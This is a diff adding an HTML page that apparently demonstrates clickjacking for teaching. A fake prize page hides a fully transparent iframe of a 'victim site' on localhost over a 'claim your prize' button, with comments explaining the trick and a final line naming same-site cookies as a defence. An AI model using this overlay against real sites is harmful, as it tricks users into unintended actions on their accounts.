@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+    <title>You won a prize</title>
+</head>
+
+<body>
+    <style>
+        iframe {
+            /* iframe from the victum site */
+            width: 400px;
+            height: 100px;
+            position: absolute;
+            top: 0;
+            left: -20px;
+            opacity: 0;
+            /* in real opacity: 0 */
+            z-index: 1;
+        }
+    </style>
+    <p>
+        Congrats!! You won a prize, like, the mobile phone you dreamt of!
+        Or the game console that is out of stock for some reasons.
+    </p>
+    <p>
+        DOn't read the small lines!
+    </p>
+    <!-- The iframe is fully transparent which positions over the button so it functions instead of the button. -->
+    <!-- in which this iframe, as it run on the domain of the user, have access to your cookies from the bank. -->
+    <iframe src="http://localhost:4000"></iframe>
+    <button>
+        CLICK HERE TO CLAIM YOUR PRIZE
+    </button>
+</body>
+
+</html>
+<!-- Use same-site cookies to prevent the cookies to be valid in the iframe. -->
